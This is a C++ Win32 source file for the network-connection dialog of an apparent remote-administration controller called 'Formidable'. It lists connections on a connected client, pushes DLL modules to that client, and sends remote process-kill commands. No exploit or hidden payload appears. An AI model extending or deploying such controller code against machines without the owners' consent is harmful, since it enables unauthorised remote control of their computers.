#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
// NetworkDialog.cpp - 网络管理对话框实现
#include "NetworkDialog.h"
#include "ModuleDialog.h"
#include "../../Common/ClientTypes.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../GlobalState.h"
#include "../NetworkHelper.h"
#include "../Core/CommandHandler.h"
#include <CommCtrl.h>
#include <map>
#include <mutex>

// 外部声明
extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern HINSTANCE g_hInstance;
extern std::map<HWND, Formidable::ListViewSortInfo> g_SortInfo;
int CALLBACK ListViewCompareProc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort);

namespace Formidable {
namespace UI {

// 静态映射：对话框句柄 -> 客户端ID
static std::map<HWND, uint32_t> s_dlgToClientId;

INT_PTR CALLBACK NetworkDialog::DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_dlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_NETWORK)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_NETWORK)));
        
        HWND hList = GetDlgItem(hDlg, IDC_LIST_NETWORK);
        ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"进程名";   lvc.cx = 160; SendMessageW(hList, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"PID";      lvc.cx = 70;  SendMessageW(hList, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"协议";     lvc.cx = 60;  SendMessageW(hList, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"本地IP";   lvc.cx = 120; SendMessageW(hList, LVM_INSERTCOLUMNW, 3, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"本地端口"; lvc.cx = 70;  SendMessageW(hList, LVM_INSERTCOLUMNW, 4, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"远程IP";   lvc.cx = 120; SendMessageW(hList, LVM_INSERTCOLUMNW, 5, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"远程端口"; lvc.cx = 70;  SendMessageW(hList, LVM_INSERTCOLUMNW, 6, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"状态";     lvc.cx = 100; SendMessageW(hList, LVM_INSERTCOLUMNW, 7, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"进程目录"; lvc.cx = 260; SendMessageW(hList, LVM_INSERTCOLUMNW, 8, (LPARAM)&lvc);
        
        ApplyModernTheme(hDlg);
        SendMessage(hDlg, WM_COMMAND, IDM_NET_REFRESH, 0);
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_LIST_NETWORK), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_NOTIFY: {
        LPNMHDR nm = (LPNMHDR)lParam;
        if (nm->idFrom == IDC_LIST_NETWORK) {
            if (nm->code == NM_RCLICK) {
                POINT pt;
                GetCursorPos(&pt);
                HMENU hMenu = CreatePopupMenu();
                AppendMenuW(hMenu, MF_STRING, IDM_NET_REFRESH, L"刷新列表(&R)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_MODULES, L"查看DLL(&D)");
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_KILL, L"结束进程(&K)");
                AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
                AppendMenuW(hMenu, MF_STRING, IDM_PROCESS_COPY_PATH, L"复制路径(&C)");
                TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
                DestroyMenu(hMenu);
            } else if (nm->code == LVN_COLUMNCLICK) {
                LPNMLISTVIEW pnmlv = (LPNMLISTVIEW)lParam;
                HWND hList = pnmlv->hdr.hwndFrom;

                if (!g_SortInfo.count(hList)) {
                    g_SortInfo[hList] = { pnmlv->iSubItem, true, hList };
                }

                if (g_SortInfo[hList].column == pnmlv->iSubItem) {
                    g_SortInfo[hList].ascending = !g_SortInfo[hList].ascending;
                } else {
                    g_SortInfo[hList].column = pnmlv->iSubItem;
                    g_SortInfo[hList].ascending = true;
                }

                ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
            }
        }
        break;
    }
    case WM_COMMAND: {
        uint32_t clientId = s_dlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        if (!client) break;

        switch (LOWORD(wParam)) {
        case IDM_NET_REFRESH: {
            SendModuleToClient(clientId, CMD_LOAD_MODULE, L"NetworkManager.dll", CMD_NETWORK_LIST);
            break;
        }
        case IDM_PROCESS_MODULES: {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_NETWORK);
            int selected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (selected >= 0) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = selected;
                ListView_GetItem(hList, &lvi);
                uint32_t pid = (uint32_t)lvi.lParam;

                SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);
                ShowModuleDialog(hDlg, clientId, pid);
            }
            break;
        }
        case IDM_PROCESS_KILL: {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_NETWORK);
            int selected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (selected >= 0) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = selected;
                ListView_GetItem(hList, &lvi);
                uint32_t pid = (uint32_t)lvi.lParam;

                SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ProcessManager.dll", CMD_PROCESS_LIST);

                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = CMD_PROCESS_KILL;
                pkg.arg1 = 0;
                pkg.arg2 = pid;

                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> sendBuf(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* h = (Formidable::PkgHeader*)sendBuf.data();
                memcpy(h->flag, "FRMD26?", 7);
                h->originLen = (int)bodySize;
                h->totalLen = (int)sendBuf.size();
                memcpy(sendBuf.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);

                SendDataToClient(client, sendBuf.data(), (int)sendBuf.size());
            }
            break;
        }
        case IDM_PROCESS_COPY_PATH: {
            HWND hList = GetDlgItem(hDlg, IDC_LIST_NETWORK);
            int selected = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
            if (selected >= 0) {
                wchar_t szPath[MAX_PATH];
                ListView_GetItemText(hList, selected, 8, szPath, MAX_PATH);

                if (OpenClipboard(hDlg)) {
                    EmptyClipboard();
                    size_t len = (wcslen(szPath) + 1) * sizeof(wchar_t);
                    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                    if (hMem) {
                        memcpy(GlobalLock(hMem), szPath, len);
                        GlobalUnlock(hMem);
                        SetClipboardData(CF_UNICODETEXT, hMem);
                    }
                    CloseClipboard();
                }
            }
            break;
        }
        }
        break;
    }
    case WM_CLOSE:
        DestroyWindow(hDlg);
        s_dlgToClientId.erase(hDlg);
        return (INT_PTR)TRUE;
    }
    return (INT_PTR)FALSE;
}

HWND NetworkDialog::Show(HWND hParent, uint32_t clientId) {
    HWND hDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_NETWORK), hParent, DlgProc, (LPARAM)clientId);
    return hDlg;
}

} // namespace UI
} // namespace Formidable
